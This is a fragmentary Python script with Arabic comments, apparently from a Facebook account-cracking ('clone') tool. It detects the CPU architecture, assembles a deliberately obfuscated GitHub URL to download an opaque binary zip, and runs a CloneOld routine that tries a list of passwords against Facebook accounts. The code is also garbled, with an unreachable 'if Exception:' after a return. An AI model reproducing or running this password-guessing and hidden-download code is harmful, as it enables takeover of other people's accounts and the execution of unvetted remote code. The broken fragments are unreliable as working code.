...
# التحقق إذا كان المجلد موجودًا
if not os.path.exists('crypto'):
    os.mkdir('crypto')  # إنشاء المجلد إذا لم يكن موجودًا
hh = 'ho'
hh2 = '9/pycrypt'
find_aarch = subprocess.check_output('uname -om', shell=True)
find_aarch_str = str(find_aarch).lower()  # تحويل إلى حروف صغيرة لتجنب القيم المختلفة في الأحرف الكبيرة والصغيرة

if 'aarch64' in find_aarch_str:
    user_aarch = '64'
    download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in find_aarch_str:
    user_aarch = '32'
...
# هنا يمكن أن تضع المزيد من الكود لاستخدام download_link إذا تم تحديد المعمارية بشكل صحيح
    ...
    def CloneOld(self, ids, passlist):
        ...
        for pas in passlist:
            ...
            if 'www.facebook.com' in response['error']['message']:
                ...
                'accept-encoding'
        self.loop += 1
        self.loop_property = 'graphservice'
        return None
        if Exception:
